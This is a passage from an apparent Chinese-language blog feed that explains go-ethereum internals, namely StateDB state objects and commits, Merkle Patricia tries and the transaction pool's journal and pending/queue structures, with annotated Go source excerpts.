class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// core/state/statedb.go:408</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(self *StateDB)</span> <span class="hljs-title">getStateObject</span><span class="hljs-params">(addr common.Address)</span> <span class="hljs-params">(stateObject *stateObject)</span></span> &#123;<br><span class="hljs-keyword">if</span> obj := self.stateObjects[addr]; obj != <span class="hljs-literal">nil</span> &#123;<span class="hljs-comment">//①</span><br><span class="hljs-keyword">if</span> obj.deleted &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> obj<br>&#125;<br><br>enc, err := self.trie.TryGet(addr[:])<span class="hljs-comment">//②</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(enc) == <span class="hljs-number">0</span> &#123;<br>self.setError(err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">var</span> data Account<br><span class="hljs-keyword">if</span> err := rlp.DecodeBytes(enc, &amp;data); err != <span class="hljs-literal">nil</span> &#123;<span class="hljs-comment">//③</span><br>log.Error(<span class="hljs-string">&quot;Failed to decode state object&quot;</span>, <span class="hljs-string">&quot;addr&quot;</span>, addr, <span class="hljs-string">&quot;err&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>obj := newObject(self, addr, data)<span class="hljs-comment">//④</span><br>self.setStateObject(obj)<br><span class="hljs-keyword">return</span> obj<br>&#125;<br></code></pre></td></tr></table></figure><p>state.getStateObject(addr)方法，将返回指定账户的 StateObject，不存在时 nil。<br>state 的 stateObject Map 中记录这从实例化 State 到当下，所有访问过的账户的 StateObject。 因此，获取 StateObject 时先从 map 缓存中检查是否已打开 ①，如果存在则返回。** 如果是第一次使用，则以账户地址为 key 从树中查找读取账户状态数据<strong>②。读取到的数据，是被 RLP 序列化过的，因此，在读取到数据后，还需要进行反序列化 ③。为了降低 IO 和在内存中维护可能被修改的 Account 信息，会将其组装成 **StateObjec ④ 存储在 State 实例</strong>中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/state/state_object.go:108</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newObject</span><span class="hljs-params">(db *StateDB, address common.Address, data Account)</span> *<span class="hljs-title">stateObject</span></span> &#123;<br><span class="hljs-keyword">if</span> data.Balance == <span class="hljs-literal">nil</span> &#123;<br>data.Balance = <span class="hljs-built_in">new</span>(big.Int)<br>&#125;<br><span class="hljs-keyword">if</span> data.CodeHash == <span class="hljs-literal">nil</span> &#123;<br>data.CodeHash = emptyCodeHash<br>&#125;<br><span class="hljs-keyword">return</span> &amp;stateObject&#123;<br>db:            db,<br>address:       address,<br>addrHash:      crypto.Keccak256Hash(address[:]),<span class="hljs-comment">//⑤</span><br>data:          data,<br>originStorage: <span class="hljs-built_in">make</span>(Storage),<br>dirtyStorage:  <span class="hljs-built_in">make</span>(Storage),<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>newObject 就是将对 Account 的操作进行辅助，其中记录了账户地址、地址哈希 ⑤ 等内容，最终你读写状态都经过 stateObject 完成。</p><h2 id="StateDB-完成持久化"><a href="#StateDB-完成持久化" class="headerlink" title="StateDB 完成持久化"></a>StateDB 完成持久化</h2><p>在区块中，将交易作为输入条件，来根据一系列动作修改状态。<br>在完成区块挖矿前，只是获得在内存中的状态树的 Root 值。 StateDB 可视为一个内存数据库，状态数据先在内存数据库中完成修改，所有关于状态的计算都在内存中完成。 在将区块持久化时完成有内存到数据库的更新存储，此更新属于增量更新，仅仅修改涉及到被修改部分。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// core/state/statedb.go:680</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *StateDB)</span> <span class="hljs-title">Commit</span><span class="hljs-params">(deleteEmptyObjects <span class="hljs-keyword">bool</span>)</span> <span class="hljs-params">(root common.Hash, err error)</span></span> &#123;<br><span class="hljs-keyword">defer</span> s.clearJournalAndRefund()<br><br><span class="hljs-keyword">for</span> addr := <span class="hljs-keyword">range</span> s.journal.dirties &#123;<span class="hljs-comment">//①⑧⑨⑩</span><br>s.stateObjectsDirty[addr] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br><span class="hljs-keyword">for</span> addr, stateObject := <span class="hljs-keyword">range</span> s.stateObjects &#123;<span class="hljs-comment">//②</span><br>_, isDirty := s.stateObjectsDirty[addr]<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> stateObject.suicided || (isDirty &amp;&amp; deleteEmptyObjects &amp;&amp; stateObject.empty()):<br><span class="hljs-comment">//③</span><br>s.deleteStateObject(stateObject)<br><span class="hljs-keyword">case</span> isDirty:<br><span class="hljs-keyword">if</span> stateObject.code != <span class="hljs-literal">nil</span> &amp;&amp; stateObject.dirtyCode &#123;<span class="hljs-comment">//④</span><br>s.db.TrieDB().InsertBlob(common.BytesToHash(stateObject.CodeHash()), stateObject.code)<br>stateObject.dirtyCode = <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">if</span> err := stateObject.CommitTrie(s.db); err != <span class="hljs-literal">nil</span> &#123;<span class="hljs-comment">//⑤</span><br><span class="hljs-keyword">return</span> common.Hash&#123;&#125;, err<br>&#125;<br>s.updateStateObject(stateObject)<span class="hljs-comment">//⑥</span><br>&#125;<br><span class="hljs-built_in">delete</span>(s.stateObjectsDirty, addr)<br>&#125;<br><span class="hljs-comment">//...</span><br>root, err = s.trie.Commit(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(leaf []<span class="hljs-keyword">byte</span>, parent common.Hash)</span> <span class="hljs-title">error</span></span> &#123;<span class="hljs-comment">//⑦</span><br><span class="hljs-keyword">var</span> account Account<br><span class="hljs-keyword">if</span> err := rlp.DecodeBytes(leaf, &amp;account); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">if</span> account.Root != emptyRoot &#123;<br>s.db.TrieDB().Reference(account.Root, parent)<br>&#125;<br>code := common.BytesToHash(account.CodeHash)<br><span class="hljs-keyword">if</span> code != emptyCode &#123;<br>s.db.TrieDB().Reference(code, parent)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;)<br><span class="hljs-keyword">return</span> root, err<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%AD%98%E5%82%A8-2.png#clientId=u34e3a6f1-8d42-4&from=paste&height=506&id=ufcde743f&margin=%5Bobject%20Object%5D&originHeight=1012&originWidth=936&originalType=url&status=done&style=none&taskId=u9036f292-bba3-41a2-a09a-3566a7f7e94&width=468"><br>如上图所示，上半部分均属于内存操作，仅仅在 stateDB.Commit()时才将状态通过树提交到 leveldb 中。</p><h1 id="MPT-默克尔压缩前缀树"><a href="#MPT-默克尔压缩前缀树" class="headerlink" title="MPT-默克尔压缩前缀树"></a>MPT-默克尔压缩前缀树</h1><p>是一种经过改良的、融合了默克尔树和前缀树两种树结构优点的数据结构，是以太坊中用来组织管理账户数据、生成交易集合哈希的重要数据结构。一个非叶节点存储在 leveldb 关系型数据库中，数据库中的 key 是节点的 RLP 编码的 sha3 哈希，value 是节点的 RLP 编码。想要获得一个非叶节点的子节点，只需要根据子节点的 hash 访问数据库获得节点的 RLP 编码，然后解码就行了。<br>以太坊有四种前缀树：</p><ol><li><strong>世界状态树包括了从地址到账户状态之间的映射。</strong> 世界状态树的根节点哈希值由区块保存（在 stateRoot 字段），它标示了区块创建时的当前状态。<strong>整个网络中只有一个世界状态树。</strong></li><li><strong>账户存储树保存了与某一智能合约相关的数据信息。</strong>由账户状态保存账户存储树的根节点哈希值（在 storageRoot 字段）。<strong>每个账户都有一个账户存储树。</strong></li><li><strong>交易树包含了一个区块中的所有交易信息。</strong>由区块头（在 transactionsRoot 区域）保存交易树的根节点哈希值。<strong>每个区块都有一棵交易树。</strong></li><li><strong>交易收据树包含了一个区块中所有交易的收据信息。</strong>同样由区块头（在 receiptsRoot 区域）保存交易收据树的根节点哈希值；<strong>每个区块都有对应的交易收据树。</strong></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>交易内存池底层实现</title>
    <link href="/2021/04/15/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0_new/"/>
    <url>/2021/04/15/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0_new/</url>
    
    <content type="html"><![CDATA[<p>既然要从头搭建一个区块链网络，交易池是绕不开的一个核心底层。对于它，以下几个问题是需要解决的：</p><ol><li>用户发起的交易请求（不论以何种方式）是如何转变为实际的交易的；</li><li>产生的交易如果不能被及时处理，是如何进入交易池的；</li><li>本地产生的交易和从网络中接收到的交易进入交易池是否有区别；</li><li>交易池的基本数据结构是怎么样的（优先队列？）</li><li>从交易池中提取交易进行打包时顺序是怎么样的（调度算法）<blockquote><p>网络中很多文章提到内存池，指的就是是 txpool</p></blockquote></li></ol><a id="more"></a><h1 id="交易形成"><a href="#交易形成" class="headerlink" title="交易形成"></a>交易形成</h1><p>以下均为作品赛项目的内容。<br>首先，我们的交易请求会赋值到 TxRaw 结构体的一个实例中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//用于接收客户端发来的序列化post原始信息</span><br><span class="hljs-keyword">type</span> TxRaw <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">//公钥hash</span><br>Address []<span class="hljs-keyword">byte</span> <span class="hljs-string">`json:&quot;address&quot;`</span><br><br>Fee <span class="hljs-keyword">int</span> <span class="hljs-string">`json:&quot;int&quot;`</span><br><br><span class="hljs-comment">//交易核心</span><br>RangeBloom bloom.RangeBloom <span class="hljs-string">`json:&quot;rbloom&quot;`</span><br>TimeBloom  bloom.TimeBloom  <span class="hljs-string">`json:&quot;tbloom&quot;`</span><br><br><span class="hljs-comment">//签名相关</span><br>Pubkey sm2.PublicKey <span class="hljs-string">`json:&quot;pubkey&quot;`</span><br>Sign   []<span class="hljs-keyword">byte</span>        <span class="hljs-string">`json:&quot;sign&quot;`</span><br><br><span class="hljs-comment">//交易同态密文拼接，用于k-top查找</span><br>Cipher <span class="hljs-keyword">string</span> <span class="hljs-string">`json:&quot;cipher&quot;`</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后这个实例被传递到一个 SendTransaction 函数，用来创建一个交易 Tx。创建交易的过程如下：</p><ol><li>根据 Address 字段找到当前账户</li><li>设置交易默认参数</li><li>检查交易签名是否合法</li><li>检查交易是否冲突</li><li>对交易进行序列化，变为可存储和传输的形式。</li><li>提交交易到交易池</li></ol><h1 id="交易管理"><a href="#交易管理" class="headerlink" title="交易管理"></a>交易管理</h1><p>以太坊将交易按状态分为两部分：<strong>可执行交易</strong>和<strong>非可执行交易</strong>。分别记录在 pending 容器中和 queue 容器中。<br><img src="https://image.hackerjerry.top/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-1.png#clientId=u272c35f2-3d2a-4&from=paste&height=321&id=u5bf56761&margin=%5Bobject%20Object%5D&originHeight=538&originWidth=1160&originalType=binary&size=164987&status=done&style=none&taskId=u567ff6dc-553f-4a1c-af77-71fc9a19a73&width=693"><br>如上图所示，交易池先采用一个 txLookup (内部为 map）跟踪所有交易。同时将交易根据本地优先，价格优先原则将交易划分为两部分 queue 和 pending。而这两部交易则按账户分别跟踪。<br>为了不丢失未完成的本地交易，以太坊交易池通过 journal 文件存储和管理当前交易池中的本地交易，并定期更新存储。<br>下图是<strong>交易池对本地待处理交易的磁盘存储管理流程</strong>，涉及加载、实时写入和定期更新维护。<br><img src="https://image.hackerjerry.top/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-2.png#clientId=u272c35f2-3d2a-4&from=paste&height=826&id=ufc47fc0d&margin=%5Bobject%20Object%5D&originHeight=1356&originWidth=870&originalType=url&status=done&style=none&taskId=ubb8c227e-5868-49f4-b1ea-77abbe42349&width=530"></p><h2 id="存储交易"><a href="#存储交易" class="headerlink" title="存储交易"></a>存储交易</h2><p><img src="https://image.hackerjerry.top/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-3.png#clientId=u272c35f2-3d2a-4&from=paste&height=317&id=uc114cf13&margin=%5Bobject%20Object%5D&originHeight=432&originWidth=826&originalType=url&status=done&style=none&taskId=u8fb70d54-24fd-45a9-880e-9b7951920f0&width=606"><br>当交易池新交易来自于本地账户时 ❶，如果已开启记录本地交易，则将此交易加入 journal ❷。到交易池时，将实时存储到 journal 文件中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_pool.go:757</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *TxPool)</span> <span class="hljs-title">journalTx</span><span class="hljs-params">(from common.Address, tx *types.Transaction)</span></span> &#123;<br>   <span class="hljs-comment">// Only journal if it&#x27;s enabled and the transaction is local</span><br>   <span class="hljs-keyword">if</span> pool.journal == <span class="hljs-literal">nil</span> || !pool.locals.contains(from) &#123;<span class="hljs-comment">//❶</span><br>      <span class="hljs-keyword">return</span><br>   &#125;<br>   <span class="hljs-keyword">if</span> err := pool.journal.insert(tx); err != <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">//❷</span><br>      log.Warn(<span class="hljs-string">&quot;Failed to journal local transaction&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而 journal.insert 则将交易实时写入文件流中 ❸，相当于实时存储到磁盘。而在写入时，是将交易进行 RLP 编码。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_journal.go:120</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(journal *txJournal)</span> <span class="hljs-title">insert</span><span class="hljs-params">(tx *types.Transaction)</span> <span class="hljs-title">error</span></span> &#123;<br>   <span class="hljs-keyword">if</span> journal.writer == <span class="hljs-literal">nil</span> &#123;<br>      <span class="hljs-keyword">return</span> errNoActiveJournal<br>   &#125;<br>   <span class="hljs-keyword">if</span> err := rlp.Encode(journal.writer, tx); err != <span class="hljs-literal">nil</span> &#123;<span class="hljs-comment">//❸</span><br>      <span class="hljs-keyword">return</span> err<br>   &#125;<br>   <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>插一嘴，为什么要用 RLP 编码？</p></blockquote><h3 id="什么是-RLP"><a href="#什么是-RLP" class="headerlink" title="什么是 RLP"></a>什么是 RLP</h3><p>RLP(Recursive Length Prefix) 递归长度前缀编码是以太坊中最常使用的序列化格式方法。<br>RLP 旨在<strong>成为高度简约的序列化方法</strong>，<strong>唯一目标</strong>就是<strong>存储嵌套的字节数组</strong>。<br>RLP 只是以嵌套数组形式存储结构型数据，由上层协议来确定数组的含义。<br><img src="https://image.hackerjerry.top/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-4.png#clientId=u272c35f2-3d2a-4&from=paste&height=443&id=u3b9d54f1&margin=%5Bobject%20Object%5D&originHeight=886&originWidth=1716&originalType=url&status=done&style=none&taskId=u8fd870e4-dcb8-44b2-bd3b-a5ba9cd4ba8&width=858"><br>从图中可以看出，不同类型的数据，将有不同的前缀标识。 前缀也可以理解为报文头，通过报文头可准确获取报文内容。 图中灰色部分则为 RLP 编码输出前缀。</p><h2 id="加载已存储交易"><a href="#加载已存储交易" class="headerlink" title="加载已存储交易"></a>加载已存储交易</h2><p>在交易池首次启动 journal 时，将主动将该文件已存储的交易加载到交易池。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_journal.go:61</span><br><span class="hljs-keyword">if</span> _, err := os.Stat(journal.path); os.IsNotExist(err) &#123; <span class="hljs-comment">//❶</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// Open the journal for loading any past transactions</span><br>input, err := os.Open(journal.path) <span class="hljs-comment">//❷</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>   <span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> input.Close()<br></code></pre></td></tr></table></figure><p>处理时，如果文件不存在则退出 ❶，否则 Open 文件，获得 input 文件流 ❷。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_journal.go:76</span><br>stream := rlp.NewStream(input, <span class="hljs-number">0</span>)<span class="hljs-comment">//❸</span><br>total, dropped := <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>因为存储的内容格式是 rlp 编码内容，因此可以直接初始化 rlp 内容流 ❸，为连续解码做准备。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>   failure error<br>   batch   types.Transactions<br>)<br><span class="hljs-keyword">for</span> &#123;<br>   tx := <span class="hljs-built_in">new</span>(types.Transaction)<br>   <span class="hljs-keyword">if</span> err = stream.Decode(tx); err != <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">//❹</span><br>      <span class="hljs-keyword">if</span> err != io.EOF &#123;<br>         failure = err<br>      &#125;<br>      <span class="hljs-keyword">if</span> batch.Len() &gt; <span class="hljs-number">0</span> &#123;<span class="hljs-comment">//❼</span><br>         loadBatch(batch)<br>      &#125;<br>      <span class="hljs-keyword">break</span><br>   &#125;<br>   total++<br><br>   <span class="hljs-keyword">if</span> batch = <span class="hljs-built_in">append</span>(batch, tx); batch.Len() &gt; <span class="hljs-number">1024</span> &#123;<span class="hljs-comment">//❺</span><br>      loadBatch(batch)<span class="hljs-comment">//❻</span><br>      batch = batch[:<span class="hljs-number">0</span>]<br>   &#125;<br>&#125;<br><br>loadBatch := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(txs types.Transactions)</span></span> &#123;<br>   <span class="hljs-keyword">for</span> _, err := <span class="hljs-keyword">range</span> add(txs) &#123;<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         log.Debug(<span class="hljs-string">&quot;Failed to add journaled transaction&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>         dropped++ <span class="hljs-comment">//❽</span><br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接进入 for 循环遍历，不断从 stream 中一笔笔地解码出交易 ❹。<br>但交易并非单笔直接载入交易池，而是采用批量提交模式，每 1024 笔交易提交一次 ❺。<br>批量写入，有利于降低交易池在每次写入交易后的更新。一个批次只需要更新（排序与超限处理等）一次。当然在遍历结束时（err==io.EOF）,也需要将当前批次中的交易载入 ❼。<br>loadBatch 就是将交易一批次加入到交易池，并获得交易池的每笔交易的处理情况。如果交易加入失败，则进行计数 ❽。最终在 load 方法执行完毕时，显示交易载入情况。</p><h1 id="交易添加到交易池"><a href="#交易添加到交易池" class="headerlink" title="交易添加到交易池"></a>交易添加到交易池</h1><p>SendTransaction 最后调用 SubmitTransaction 函数将交易提交到交易池，不过，更底层的调用是 AddLocals 函数。<br>这里需要注意，本地交易时调用 AddLocals，而从对等 p2p 节点发来的交易调用的是另一个函数，AddRemotes 函数。调用这两个函数之前都应该验证交易的有效性。<br><img src="https://image.hackerjerry.top/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-5.png#clientId=u272c35f2-3d2a-4&from=paste&height=264&id=ue6089192&margin=%5Bobject%20Object%5D&originHeight=528&originWidth=1174&originalType=binary&size=236384&status=done&style=none&taskId=uf8820385-fb3b-42bb-ab6f-9ae0571e933&width=587"></p><blockquote><p>因为交易时通过节点的 API 接收，因此此交易被视为一笔来自本地(local)（图中用红球表示），在经过一系列校验和处理后。交易成功进入交易池，随后向已连接的邻近节点发送此交易。<br>当邻近节点，如矿工节点从邻近节点接收到此交易时，在进入交易池之前。会将交易标记为来自远方（remote）的交易（图中用绿球表示）。也需要经过校验和处理后，进入矿工节点的交易池，等待矿工打包到区块中。<br>如果邻近节点，不是矿工，也无妨。因为任何节点会默认将接受到得合法交易及时发送给邻近节点。得益于 P2P 网络，一笔交易平均在 6s 内扩散到整个以太坊公链网络的各个节点中。</p></blockquote><p><img src="https://image.hackerjerry.top/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0-6.png#clientId=u272c35f2-3d2a-4&from=paste&height=254&id=u528314c1&margin=%5Bobject%20Object%5D&originHeight=373&originWidth=924&originalType=binary&size=74906&status=done&style=none&taskId=uae16074d-7e82-4415-a530-f8a271e0047&width=629"><br>下面我们来看一下交易池的结构：</p><blockquote><p>这是以太坊的</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// TxPool contains all currently known transactions. Transactions</span><br><span class="hljs-comment">// enter the pool when they are received from the network or submitted</span><br><span class="hljs-comment">// locally. They exit the pool when they are included in the blockchain.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// The pool separates processable transactions (which can be applied to the</span><br><span class="hljs-comment">// current state) and future transactions. Transactions move between those</span><br><span class="hljs-comment">// two states over time as they are received and processed.</span><br><span class="hljs-keyword">type</span> TxPool <span class="hljs-keyword">struct</span> &#123;<br>config      TxPoolConfig<br>chainconfig *params.ChainConfig<br>chain       blockChain<br>gasPrice    *big.Int<br>txFeed      event.Feed<br>scope       event.SubscriptionScope<br>signer      types.Signer<br>mu          sync.RWMutex<br><br>istanbul <span class="hljs-keyword">bool</span> <span class="hljs-comment">// Fork indicator whether we are in the istanbul stage.</span><br><br>currentState  *state.StateDB <span class="hljs-comment">// Current state in the blockchain head</span><br>pendingNonces *txNoncer      <span class="hljs-comment">// Pending state tracking virtual nonces</span><br>currentMaxGas <span class="hljs-keyword">uint64</span>         <span class="hljs-comment">// Current gas limit for transaction caps</span><br><br>locals  *accountSet <span class="hljs-comment">// Set of local transaction to exempt from eviction rules</span><br>journal *txJournal  <span class="hljs-comment">// Journal of local transaction to back up to disk</span><br><br>pending <span class="hljs-keyword">map</span>[common.Address]*txList   <span class="hljs-comment">// All currently processable transactions</span><br>queue   <span class="hljs-keyword">map</span>[common.Address]*txList   <span class="hljs-comment">// Queued but non-processable transactions</span><br>beats   <span class="hljs-keyword">map</span>[common.Address]time.Time <span class="hljs-comment">// Last heartbeat from each known account</span><br>all     *txLookup                    <span class="hljs-comment">// All transactions to allow lookups</span><br>priced  *txPricedList                <span class="hljs-comment">// All transactions sorted by price</span><br><br>chainHeadCh     <span class="hljs-keyword">chan</span> ChainHeadEvent<br>chainHeadSub    event.Subscription<br>reqResetCh      <span class="hljs-keyword">chan</span> *txpoolResetRequest<br>reqPromoteCh    <span class="hljs-keyword">chan</span> *accountSet<br>queueTxEventCh  <span class="hljs-keyword">chan</span> *types.Transaction<br>reorgDoneCh     <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>reorgShutdownCh <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;  <span class="hljs-comment">// requests shutdown of scheduleReorgLoop</span><br>wg              sync.WaitGroup <span class="hljs-comment">// tracks loop, scheduleReorgLoop</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其中最核心的是两个字段，pending 和 queue<br><strong>queued 存放未来的、当前无法执行的交易</strong>。以太坊使用 nonce 值决定某个账户的交易顺序，多条交易值 nonce 值必须连续，如果和过去的交易不连续，则无法执行，我们不妨使用 nonce 值，标记交易的号码，nonce 为 10 的交易，称为第 10 号交易。举个例子，当前账户的 nonce 是 10，txpool 中有该账户的第 100 号交易，但 txpool 中没有第 11<del>99 号交易，这些交易的缺失，造成第 100 号交易无法执行，所以第 100 号交易就是未来的交易、不可执行的交易，存放在 queue 中。<br><strong>pending 存放可执行的交易</strong>。比如我们把上面的 11</del>99 号交易补全了，那么 11~100 号交易都可以进入到 pending，因为这些交易都是连续的，都可以打包进区块。<br>当节点收到交易（本地节点发起的或 peer 广播来的）时，会先存放到 queued，txpool 在某些情况下，把 queued 中可执行的交易，转移到 pending 中。<br>其中 config 的结构体为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 